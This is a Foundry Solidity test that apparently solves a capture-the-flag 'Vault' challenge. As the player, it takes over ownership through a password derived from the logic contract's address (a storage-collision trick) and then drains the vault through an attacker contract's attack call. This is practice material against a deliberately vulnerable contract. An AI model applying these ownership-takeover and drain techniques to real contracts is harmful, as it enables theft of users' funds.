// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";
import "../src/AttackVault.sol";


contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.

        // init attacker
        AttackVault attacker = new AttackVault(address(vault), palyer);

        // change the owner 
        bytes32 password = bytes32(uint256(uint160(address(logic))));
        attacker.attackChangeOwner(password, palyer);
        console.log("owner:", vault.owner());
        
        // attck to withdraw
        vault.openWithdraw();
        attacker.attack{value: 0.1 ether}();

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

}